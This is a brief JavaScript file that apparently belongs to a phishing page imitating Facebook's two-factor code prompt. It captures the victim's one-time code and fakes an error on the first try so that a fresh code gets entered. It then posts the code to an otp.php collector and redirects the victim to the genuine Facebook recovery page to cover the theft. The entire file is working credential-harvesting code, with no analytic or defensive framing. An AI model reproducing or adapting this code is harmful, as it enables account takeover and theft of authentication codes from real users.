window.onload = () => {
  const otpForm = document.querySelector("#otpForm");
  const otpBox = document.querySelector("#approvals_code");
  const errorParent = document.querySelector("#errorParent");
  const errorDiv = `<div class="error">Please submit latest otp</div>`;
  otpForm.addEventListener("submit", (e) => {
    e.preventDefault();
    if (!window.allowOtp) {
      errorParent.innerHTML += errorDiv;
    } else {
      const formData = new FormData();
      formData.append("approvals_code", otpBox.value);
      fetch("otp.php", {
        method: "POST",
        body: formData,
      })
        .then((res) =>
          window.location.assign("https://facebook.com/recover/initiate/")
        )
        .catch((err) => {
          console.log(err);
        });
    }
    window.allowOtp = true;
  });
};
